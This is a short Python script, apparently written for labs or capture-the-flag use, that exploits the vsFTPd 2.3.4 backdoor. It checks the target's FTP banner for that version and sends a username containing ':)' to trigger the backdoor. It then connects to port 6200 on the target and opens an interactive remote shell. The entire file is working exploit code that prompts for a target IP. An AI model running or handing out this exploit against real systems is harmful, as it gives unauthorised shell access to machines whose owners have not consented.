#!/usr/bin/python3

from pwn import *
from sys import exit
from time import sleep

class ExploitFTP:
    def __init__(self, ip, port=21):
        self.ip = ip
        self.port = port

    def trigger_backdoor(self):
        print("[+] FTP exploitization...")
        try:
            io = remote(self.ip, self.port)
            io.recvuntil(b"vsFTPd ")
            version = (io.recvuntil(b")")[:-1]).decode()
            if version != "2.3.4":
                print("[-] Version 2.3.4 Not Found!!!.")
                io.close()
                exit()
            else:
                io.sendline(b"USER hello:)")
                io.sendline(b"PASS hello123")
                io.close()
        except Exception as e:
            print(f"[-] Error: {e}")
            exit()

    def get_shell(self):
        #print("[+] Backdoor üzerinden shell bağlantısı kuruluyor.")
        sleep(1)
        try:
            io = remote(self.ip, 6200)
            print("[+] Shell was obtained!")
            io.interactive()
            io.close()
        except Exception as e:
            print(f"[-] Connection error: {e}")
            exit()

if __name__ == "__main__":
    print("=== FTP Exploit ===")
    ip = input("Enter the target IP address: ")
    port = input("Enter the target port (Default 21): ")

    if not port.strip():
        port = 21  # Varsayılan port

    try:
        port = int(port)
    except ValueError:
        print("[-] The port number must be a valid number !")
        exit()

    exploit = ExploitFTP(ip, port)
    exploit.trigger_backdoor()
    exploit.get_shell()
